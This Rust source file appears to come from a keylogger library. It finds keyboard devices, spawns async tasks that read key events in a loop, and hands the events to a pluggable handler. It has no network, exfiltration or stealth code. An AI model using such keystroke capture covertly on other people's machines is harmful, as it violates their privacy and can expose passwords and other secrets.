use async_trait::async_trait;
use futures::future::join_all;
use std::path::Path;
use std::sync::Arc;

use crate::device::{find_keyboard_devices, KeyEvent, Keyboard};
use crate::error::KeyloggerError;

pub(crate) type KeyloggerResult<T> = Result<T, KeyloggerError>;

#[async_trait]
pub trait KeyEventHandler: Send + Sync {
    async fn handle_events(&self, kb_device: &Path, kb_name: &str, ev: Vec<KeyEvent>);

    fn handle_err(&self, err: KeyloggerError) -> Result<(), KeyloggerError> {
        Err(err)
    }
}

pub struct Keylogger {
    ev_handler: Arc<dyn KeyEventHandler>,
    keyboards: Vec<Keyboard>,
}

impl Keylogger {
    pub fn new(ev_handler: impl KeyEventHandler + 'static) -> KeyloggerResult<Self> {
        Ok(Self {
            ev_handler: Arc::new(ev_handler),
            keyboards: find_keyboard_devices()?.collect(),
        })
    }

    pub async fn start(self) -> KeyloggerResult<()> {
        if self.keyboards.is_empty() {
            return Err(KeyloggerError::NoDevicesFound);
        }

        let handles = self
            .keyboards
            .into_iter()
            .map(|kb| {
                let ev_handler = Arc::clone(&self.ev_handler);

                tokio::spawn(handle_key_events(ev_handler, kb))
            })
            .collect::<Vec<_>>();

        // Discard the result:
        let _ = join_all(handles).await;

        Err(KeyloggerError::KeyloggerTasksExited)
    }
}

async fn handle_key_events(
    ev_handler: Arc<dyn KeyEventHandler>,
    keyboard: Keyboard,
) -> KeyloggerResult<()> {
    let keyboard = Arc::new(keyboard);
    loop {
        let ev = match keyboard.read_key_event().await {
            Ok(ev) => ev,
            Err(e) => {
                ev_handler.handle_err(e)?;
                continue;
            }
        };

        if ev.is_empty() {
            continue;
        }

        ev_handler
            .handle_events(&keyboard.device, &keyboard.name, ev)
            .await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // TODO
}
